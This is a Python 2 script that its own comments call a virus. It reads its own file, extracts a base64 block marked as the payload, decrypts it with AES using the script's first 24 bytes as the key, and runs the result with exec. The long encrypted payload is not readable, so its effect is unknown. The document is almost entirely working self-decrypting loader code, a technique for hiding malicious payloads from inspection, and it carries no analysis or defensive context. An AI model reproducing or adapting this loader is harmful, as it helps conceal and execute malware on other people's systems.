######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted

# Start payload
#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
# End payload
